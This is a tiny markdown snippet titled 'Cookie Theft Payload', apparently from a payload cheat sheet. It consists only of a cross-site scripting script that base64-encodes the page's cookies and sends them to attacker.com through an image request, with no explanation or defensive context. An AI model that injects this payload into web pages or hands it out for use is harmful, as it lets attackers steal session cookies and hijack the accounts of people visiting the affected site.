# Cookie Theft Payload

```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```